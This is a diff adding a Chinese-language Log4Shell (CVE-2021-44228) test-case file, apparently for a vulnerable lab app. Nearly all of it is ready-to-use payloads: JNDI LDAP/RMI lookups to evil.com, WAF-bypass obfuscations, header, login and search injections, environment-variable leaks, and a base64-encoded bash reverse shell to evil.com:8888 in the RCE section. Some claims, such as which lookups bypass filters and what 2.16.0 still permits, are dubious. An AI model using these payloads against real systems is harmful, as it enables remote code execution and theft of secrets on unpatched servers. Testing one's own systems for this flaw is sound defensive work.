@@ -1,0 +1,161 @@
+# Log4Shell (Log4j2 JNDI 注入 CVE-2021-44228) 漏洞测试用例
+# Log4j 版本: 2.14.1 (漏洞版本)
+
+# ============================================
+# 1. 基础 JNDI 注入
+# ============================================
+# 端点: /log4j/vuln?token={payload}
+
+# LDAP 协议 - 基础注入
+token=${jndi:ldap://evil.com/exp}
+
+# RMI 协议
+token=${jndi:rmi://evil.com/exp}
+
+# DNS 协议 - 外带验证 (使用 dnslog.cn)
+token=${jndi:ldap://xxx.dnslog.cn/exp}
+
+
+# ============================================
+# 2. 环境变量泄露 (无需外部服务器)
+# ============================================
+
+# 泄露用户名
+token=${env:USER}
+
+# 泄露环境变量
+token=${env:HOME}
+token=${env:PATH}
+token=${env:JAVA_HOME}
+
+# 泄露系统属性
+token=${sys:java.version}
+token=${sys:os.name}
+token=${sys:os.version}
+token=${sys:user.name}
+token=${sys:user.dir}
+
+# 泄露上下文变量
+token=${ctx:loginId}
+
+
+# ============================================
+# 3. WAF 绕过 Payload
+# ============================================
+
+# Lower 转换
+token=${${lower:j}ndi:ldap://evil.com/exp}
+token=${${lower:${upper:j}ndi}:ldap://evil.com/exp}
+
+# Upper 转换
+token=${${upper:j}ndi:ldap://evil.com/exp}
+
+# 双层嵌套
+token=${${::-j}ndi:ldap://evil.com/exp}
+token=${${lower:j}${upper:n}${lower:d}i:ldap://evil.com/exp}
+
+# 环境变量嵌套
+token=${jndi:ldap://${env:USER}.evil.com/exp}
+token=${jndi:ldap://${hostName}.evil.com/exp}
+
+# 使用 ${date:} 触发
+token=${date:yyyy}
+token=${date:yyyy-MM-dd}
+
+# 使用 ${spring:} 触发
+token=${spring:main:application-name}
+
+
+# ============================================
+# 4. HTTP Header 注入
+# ============================================
+# 端点: /log4j/header
+# 需要设置 Header
+
+# User-Agent 注入
+User-Agent: ${jndi:ldap://evil.com/exp}
+
+# Referer 注入
+Referer: ${jndi:ldap://evil.com/exp}
+
+# X-Api-Version 注入
+X-Api-Version: ${jndi:ldap://evil.com/exp}
+
+# X-Forwarded-For 注入
+X-Forwarded-For: ${jndi:ldap://evil.com/exp}
+
+
+# ============================================
+# 5. 登录场景注入
+# ============================================
+# 端点: /log4j/login (POST)
+
+# 用户名注入
+username=${jndi:ldap://evil.com/exp}&password=123456
+
+# 密码注入
+username=admin&password=${jndi:ldap://evil.com/exp}
+
+
+# ============================================
+# 6. 搜索场景注入
+# ============================================
+# 端点: /log4j/search?q={payload}
+
+# 搜索关键词注入
+q=${jndi:ldap://evil.com/exp}
+q=${env:USER}
+
+
+# ============================================
+# 7. RCE Payload (需要恶意 JNDI 服务器)
+# ============================================
+
+# JNDIExploit 格式
+# ${jndi:ldap://evil.com:1389/Basic/Command/Base64/YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC9ldmlsLmNvbS84ODg4IDA+JjEn}
+
+# marshalsec 格式
+# ${jndi:ldap://evil.com:1389/Exploit}
+
+# Tomcat Echo
+# ${jndi:ldap://evil.com:1389/TomcatEcho}
+
+# Spring 回显
+# ${jndi:ldap://evil.com:1389/SpringEcho}
+
+
+# ============================================
+# 8. 检测方法
+# ============================================
+
+# DNS 外带检测 (推荐)
+# 1. 访问 http://dnslog.cn 获取子域名
+# 2. 发送: ${jndi:ldap://xxx.dnslog.cn/exp}
+# 3. 在 dnslog.cn 查看是否有 DNS 解析记录
+
+# 环境变量检测
+# ${env:USER} - 如果返回用户名，说明存在漏洞
+
+# 延迟检测
+# ${jndi:ldap://evil.com:9999/Exploit} - 超时说明存在漏洞
+
+
+# ============================================
+# 9. Log4j 受影响版本
+# ============================================
+# Apache Log4j 2.0-beta9 <= 2.14.1
+# Apache Log4j 2.15.0 (默认受防护，但可绕过)
+# Apache Log4j 2.16.0 (移除 JNDI LDAP，但 RMI 仍可利用)
+
+# 安全版本: 2.17.1+
+
+
+# ============================================
+# 验证方法
+# ============================================
+# 成功的 Log4Shell 特征:
+# 1. 环境变量泄露 (返回 USER, HOME 等值)
+# 2. 系统属性泄露 (返回 java.version, os.name 等)
+# 3. DNS 外带请求 (收到 DNS 查询记录)
+# 4. JNDI 查询延迟 (LDAP 连接超时)
+# 5. RCE 执行 (需要恶意 JNDI 服务器)
